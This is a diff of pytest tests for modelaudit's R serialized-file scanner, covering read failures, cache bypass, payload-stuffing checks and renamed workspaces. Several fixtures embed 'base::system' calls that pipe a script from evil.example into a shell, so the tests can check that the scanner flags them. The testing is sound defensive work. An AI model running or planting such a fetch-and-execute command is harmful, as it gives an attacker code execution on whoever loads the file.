@@ -2,18 +2,32 @@ from __future__ import annotations
 
 import gzip
 import lzma
+import zipfile
 from pathlib import Path
+from unittest.mock import patch
+
+import pytest
 
 from modelaudit import core
+from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.scanners import get_scanner_for_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.r_serialized_scanner import RSerializedScanner
-from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension
+from modelaudit.utils.file.detection import (
+    detect_file_format,
+    detect_file_format_for_skip_filter,
+    detect_format_from_extension,
+)
 
 
 def _write_raw_r_serialized(path: Path, body: str, *, workspace_header: bool = False) -> None:
     prefix = "RDX2\nX\n" if workspace_header else "X\n"
     path.write_bytes((prefix + body).encode("utf-8"))
+
+
+def _write_raw_r_serialized_bytes(path: Path, body: bytes, *, workspace_header: bool = False) -> None:
+    prefix = b"RDX2\nX\n" if workspace_header else b"X\n"
+    path.write_bytes(prefix + body)
 
 
 def _write_gzip_r_serialized(path: Path, body: str, *, workspace_header: bool = True) -> None:
@@ -69,6 +83,26 @@ def test_wrong_extension_with_no_signature_is_not_handled(tmp_path: Path) -> Non
     assert not RSerializedScanner.can_handle(str(path))
 
 
+def test_unavailable_declared_r_serialized_file_retains_owner_for_operational_result(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "unavailable.rds"
+    _write_raw_r_serialized(path, "safe\nmodel\nweights")
+
+    def raise_read_error(*_args: object, **_kwargs: object) -> None:
+        raise PermissionError(13, "simulated unavailable R payload")
+
+    monkeypatch.setattr("modelaudit.scanners.r_serialized_scanner.open", raise_read_error, raising=False)
+
+    scanner = get_scanner_for_file(str(path))
+
+    assert scanner is not None
+    assert scanner.name == "r_serialized"
+    result = scanner.scan(str(path))
+    assert result.metadata["operational_error_reason"] == "r_serialized_read_failed"
+
+
 def test_scan_benign_rds_model_does_not_raise_critical(tmp_path: Path) -> None:
     path = tmp_path / "benign.rds"
     _write_raw_r_serialized(
@@ -103,6 +137,325 @@ def test_scan_bounded_r_serialized_payload_is_inconclusive(tmp_path: Path) -> No
     assert result.success is False
     assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
     assert "r_serialized_byte_ceiling_incomplete" in result.metadata["scan_outcome_reasons"]
+
+
+def test_scan_read_failure_is_operationally_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    path = tmp_path / "read-failure.rds"
+    _write_raw_r_serialized(path, "safe\nmodel\nweights")
+    cache_dir = tmp_path / "cache"
+
+    reset_cache_manager()
+    try:
+        with patch.object(
+            RSerializedScanner,
+            "_read_payload_for_analysis",
+            side_effect=PermissionError(13, "simulated R payload read failure"),
+        ):
+            direct = RSerializedScanner().scan(str(path))
+            first = core.scan_model_directory_or_file(
+                str(path),
+                cache_enabled=True,
+                cache_dir=str(cache_dir),
+                min_cache_file_size=0,
+            )
+            second = core.scan_model_directory_or_file(
+                str(path),
+                cache_enabled=True,
+                cache_dir=str(cache_dir),
+                min_cache_file_size=0,
+            )
+
+        assert direct.success is False
+        assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
+        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
+        assert all(check.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in direct.checks)
+        read_check = _check_by_name(direct, "R Serialized Read")[0]
+        assert read_check.details["analysis_incomplete"] is True
+        assert read_check.details["scan_outcome_reason"] == "r_serialized_read_failed"
+
+        for aggregate in (first, second):
+            metadata = next(iter(aggregate.file_metadata.values()))
+            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+            assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
+            assert metadata["operational_error_reason"] == "r_serialized_read_failed"
+            assert core.determine_exit_code(aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_read_failure_bypasses_stale_clean_cache(tmp_path: Path) -> None:
+    path = tmp_path / "read-failure-after-cache.rds"
+    _write_raw_r_serialized(path, "safe\nmodel\nweights")
+    cache_dir = tmp_path / "cache"
+    cache_config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    reset_cache_manager()
+    try:
+        with patch(
+            "modelaudit.utils.helpers.cache_decorator.should_bypass_cache_for_read_failure_aware_file",
+            return_value=False,
+        ):
+            warm_result = core.scan_file(str(path), config=cache_config)
+
+        assert warm_result.success is True
+        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
+        assert cached_entries > 0
+
+        with patch.object(
+            RSerializedScanner,
+            "_read_payload_for_analysis",
+            side_effect=PermissionError(13, "simulated R payload read failure after cache warm"),
+        ):
+            direct = core.scan_file(str(path), config=cache_config)
+            aggregate = core.scan_model_directory_or_file(
+                str(path),
+                cache_enabled=True,
+                cache_dir=str(cache_dir),
+                min_cache_file_size=0,
+            )
+
+        assert direct.success is False
+        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
+        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
+        metadata = aggregate.file_metadata[str(path)]
+        assert aggregate.success is False
+        assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
+        assert metadata["operational_error_reason"] == "r_serialized_read_failed"
+        assert core.determine_exit_code(aggregate) == 2
+        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_renamed_read_failure_bypasses_stale_clean_cache(tmp_path: Path) -> None:
+    path = tmp_path / "read-failure-after-cache.jpg"
+    _write_raw_r_serialized(path, "safe\nmodel\nweights", workspace_header=True)
+    cache_dir = tmp_path / "cache"
+    cache_config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    reset_cache_manager()
+    try:
+        with patch(
+            "modelaudit.utils.helpers.cache_decorator.should_bypass_cache_for_read_failure_aware_file",
+            return_value=False,
+        ):
+            warm_result = core.scan_file(str(path), config=cache_config)
+
+        assert warm_result.success is True
+        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
+        assert cached_entries > 0
+
+        with patch.object(
+            RSerializedScanner,
+            "_read_payload_for_analysis",
+            side_effect=PermissionError(13, "simulated renamed R payload read failure after cache warm"),
+        ):
+            direct = core.scan_file(str(path), config=cache_config)
+            aggregate = core.scan_model_directory_or_file(
+                str(path),
+                cache_enabled=True,
+                cache_dir=str(cache_dir),
+                min_cache_file_size=0,
+            )
+
+        assert direct.success is False
+        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
+        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
+        metadata = aggregate.file_metadata[str(path)]
+        assert aggregate.success is False
+        assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
+        assert metadata["operational_error_reason"] == "r_serialized_read_failed"
+        assert core.determine_exit_code(aggregate) == 2
+        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_unreadable_path_is_operationally_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "unreadable.rds"
+    _write_raw_r_serialized(path, "safe\nmodel\nweights")
+    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda *_args: False)
+
+    direct = RSerializedScanner().scan(str(path))
+    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
+    assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
+    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in direct.checks)
+    metadata = aggregate.file_metadata[str(path)]
+    assert metadata["operational_error_reason"] == "r_serialized_read_failed"
+    assert core.determine_exit_code(aggregate) == 2
+
+
+def test_scan_string_extraction_ceiling_reports_incomplete_late_payload_analysis(tmp_path: Path) -> None:
+    path = tmp_path / "late-payload.rds"
+    _write_raw_r_serialized(
+        path,
+        "\n".join(
+            [
+                "feature_000",
+                "feature_001",
+                "feature_002",
+                "expression",
+                "language",
+                "base::system('curl https://evil.example/payload.sh | sh')",
+            ]
+        ),
+    )
+
+    full_result = RSerializedScanner(config={"r_max_extracted_strings": 100}).scan(str(path))
+    limited_result = RSerializedScanner(config={"r_max_extracted_strings": 2}).scan(str(path))
+
+    assert any(check.severity == IssueSeverity.CRITICAL for check in full_result.checks)
+    assert limited_result.success is False
+    assert limited_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "r_serialized_string_extraction_incomplete" in limited_result.metadata["scan_outcome_reasons"]
+    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in limited_result.checks)
+    ceiling_checks = _check_by_name(limited_result, "String Extraction Ceiling")
+    assert len(ceiling_checks) == 1
+    assert ceiling_checks[0].severity == IssueSeverity.INFO
+    assert "configured extracted-string ceiling" in ceiling_checks[0].message
+    assert ceiling_checks[0].details["analysis_incomplete"] is True
+    assert ceiling_checks[0].details["scan_outcome_reason"] == "r_serialized_string_extraction_incomplete"
+
+
+def test_scan_string_extraction_ceiling_is_exit2_and_not_cached(tmp_path: Path) -> None:
+    path = tmp_path / "limited.rds"
+    _write_raw_r_serialized(path, "feature_000\nfeature_001\nfeature_002\nfeature_003")
+    cache_dir = tmp_path / "cache"
+
+    reset_cache_manager()
+    try:
+        first = core.scan_model_directory_or_file(
+            str(path),
+            r_max_extracted_strings=2,
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        second = core.scan_model_directory_or_file(
+            str(path),
+            r_max_extracted_strings=2,
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+
+        for aggregate in (first, second):
+            metadata = aggregate.file_metadata[str(path)]
+            assert aggregate.success is False
+            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+            assert "r_serialized_string_extraction_incomplete" in metadata["scan_outcome_reasons"]
+            assert core.determine_exit_code(aggregate) == 2
+            assert not any(
+                issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues
+            )
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_dense_text_payload_still_reports_stuffing_warning(tmp_path: Path) -> None:
+    path = tmp_path / "dense.rds"
+    _write_raw_r_serialized(path, "A" * 1_000_100)
+
+    result = RSerializedScanner().scan(str(path))
+
+    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
+    assert len(stuffing_checks) == 1
+    assert stuffing_checks[0].severity == IssueSeverity.WARNING
+    assert "scan_outcome" not in result.metadata
+
+
+def test_scan_oversized_contiguous_text_reports_stuffing_below_dense_threshold(tmp_path: Path) -> None:
+    path = tmp_path / "oversized-string.rds"
+    _write_raw_r_serialized(path, "A" * 9_000)
+
+    result = RSerializedScanner().scan(str(path))
+
+    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
+    assert len(stuffing_checks) == 1
+    assert stuffing_checks[0].severity == IssueSeverity.WARNING
+    assert stuffing_checks[0].details["longest_string"] > 8_192
+    assert "scan_outcome" not in result.metadata
+
+
+def test_scan_whitespace_padding_does_not_report_payload_stuffing(tmp_path: Path) -> None:
+    path = tmp_path / "whitespace-padding.rds"
+    _write_raw_r_serialized(path, " " * 9_000)
+
+    result = RSerializedScanner().scan(str(path))
+
+    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
+    assert len(stuffing_checks) == 1
+    assert stuffing_checks[0].status == CheckStatus.PASSED
+    assert stuffing_checks[0].details["longest_string"] == 0
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_scan_short_text_with_trailing_padding_does_not_report_payload_stuffing(tmp_path: Path) -> None:
+    payload = "model" + (" " * 9_000)
+    direct_path = tmp_path / "padding.rds"
+    renamed_workspace = tmp_path / "padding.jpg"
+    _write_raw_r_serialized(direct_path, payload)
+    _write_raw_r_serialized(renamed_workspace, payload, workspace_header=True)
+
+    direct = RSerializedScanner().scan(str(direct_path))
+    renamed = core.scan_file(str(renamed_workspace), config={"cache_enabled": False})
+    aggregate = core.scan_model_directory_or_file(str(renamed_workspace), cache_enabled=False)
+
+    for result in (direct, renamed):
+        stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
+        assert len(stuffing_checks) == 1
+        assert stuffing_checks[0].status == CheckStatus.PASSED
+        assert stuffing_checks[0].details["longest_string"] == len("model")
+        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert renamed.scanner_name == "r_serialized"
+    assert core.determine_exit_code(aggregate) == 0
+
+
+def test_scan_detects_executable_call_split_at_printable_chunk_boundary(tmp_path: Path) -> None:
+    path = tmp_path / "split-system-call.rds"
+    _write_raw_r_serialized(path, "A" * 503 + "base::system('id')")
+
+    direct = RSerializedScanner().scan(str(path))
+    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)
+
+    symbol_checks = _check_by_name(direct, "Executable Symbol Context Analysis")
+    assert len(symbol_checks) == 1
+    assert symbol_checks[0].severity == IssueSeverity.CRITICAL
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
+    assert core.determine_exit_code(aggregate) == 1
+
+
+def test_scan_preserves_short_printable_tail_at_chunk_boundary(tmp_path: Path) -> None:
+    path = tmp_path / "split-system-call-tail.rds"
+    _write_raw_r_serialized_bytes(path, b"A" * 500 + b"base::system(\x00'id')")
+
+    direct = RSerializedScanner().scan(str(path))
+    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)
+
+    symbol_checks = _check_by_name(direct, "Executable Symbol Context Analysis")
+    assert len(symbol_checks) == 1
+    assert symbol_checks[0].severity == IssueSeverity.CRITICAL
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
+    assert core.determine_exit_code(aggregate) == 1
 
 
 def test_scan_benign_rdata_workspace_passes_signature_and_context_checks(tmp_path: Path) -> None:
@@ -214,6 +567,9 @@ def test_scan_corrupt_gzip_stream_is_handled_fail_closed(tmp_path: Path) -> None
     result = RSerializedScanner().scan(str(path))
 
     assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "r_serialized_decode_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert "operational_error" not in result.metadata
     decompression_checks = _check_by_name(result, "R Serialized Decompression")
     assert len(decompression_checks) == 1
     assert decompression_checks[0].status == CheckStatus.FAILED
@@ -316,3 +672,64 @@ def test_r_serialized_routes_through_detection_and_registry(tmp_path: Path) -> N
     scanner = get_scanner_for_file(str(path))
     assert scanner is not None
     assert scanner.name == "r_serialized"
+
+
+def test_core_routes_renamed_r_workspace_and_preserves_malicious_findings(tmp_path: Path) -> None:
+    path = tmp_path / "payload.jpg"
+    _write_raw_r_serialized(
+        path,
+        "expression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
+        workspace_header=True,
+    )
+
+    direct = core.scan_file(str(path), config={"cache_enabled": False})
+    aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)
+
+    assert detect_file_format(str(path)) == "r_serialized"
+    assert detect_file_format_for_skip_filter(str(path)) == "r_serialized"
+    assert RSerializedScanner.can_handle(str(path))
+    assert direct.scanner_name == "r_serialized"
+    assert _check_by_name(direct, "Executable Symbol Context Analysis")[0].severity == IssueSeverity.CRITICAL
+    assert _check_by_name(direct, "Serialized Expression Payload Detection")[0].severity == IssueSeverity.CRITICAL
+    assert core.determine_exit_code(aggregate) == 1
+    assert any(issue.location == str(path) and issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
+
+
+def test_core_routes_benign_renamed_workspace_without_promoting_weak_raw_near_match(tmp_path: Path) -> None:
+    benign_workspace = tmp_path / "benign.jpg"
+    _write_raw_r_serialized(benign_workspace, "workspace\nmodel_one\nmodel_two", workspace_header=True)
+    ambiguous_text = tmp_path / "notes.jpg"
+    ambiguous_text.write_bytes(b"X\nordinary exported table\n")
+    incomplete_workspace = tmp_path / "header-notes.jpg"
+    incomplete_workspace.write_bytes(b"RDX3\nQ\nordinary exported table\n")
+
+    direct = core.scan_file(str(benign_workspace), config={"cache_enabled": False})
+    aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)
+
+    assert direct.scanner_name == "r_serialized"
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in direct.issues)
+    assert detect_file_format_for_skip_filter(str(ambiguous_text)) == "unknown"
+    assert str(ambiguous_text) not in aggregate.file_metadata
+    assert detect_file_format_for_skip_filter(str(incomplete_workspace)) == "unknown"
+    assert str(incomplete_workspace) not in aggregate.file_metadata
+    assert core.determine_exit_code(aggregate) == 0
+
+
+def test_archive_routes_renamed_r_workspace_without_promoting_weak_raw_near_match(tmp_path: Path) -> None:
+    archive_path = tmp_path / "payload.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr(
+            "payload.jpg",
+            b"RDX3\nX\nexpression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
+        )
+        archive.writestr("notes.jpg", b"X\nordinary exported table\n")
+        archive.writestr("header-notes.jpg", b"RDX3\nQ\nordinary exported table\n")
+
+    result = core.scan_file(str(archive_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "zip"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "payload.jpg" in (issue.location or "") for issue in result.issues
+    )
+    assert not any("notes.jpg" in (issue.location or "") for issue in result.issues)
+    assert not any("header-notes.jpg" in (issue.location or "") for issue in result.issues)
